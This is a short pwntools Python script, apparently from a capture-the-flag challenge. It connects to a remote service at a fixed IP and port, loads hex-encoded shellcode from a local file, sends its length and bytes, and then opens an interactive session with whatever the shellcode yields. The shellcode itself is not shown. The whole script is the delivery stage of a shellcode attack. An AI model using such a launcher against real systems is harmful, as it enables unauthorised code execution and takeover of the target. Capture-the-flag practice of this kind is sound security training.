#!/usr/bin/env python
from pwn import *
context.update(arch='amd64', os='linux')
p, u = pack, unpack

conn = remote('202.120.7.198', 13579)
code = open('code').read()
code = code.replace(' ', '')
code = code.replace('\n', '')
code = code.decode('hex')
conn.send(p32(len(code)))
conn.send(code)

conn.interactive(prompt='')
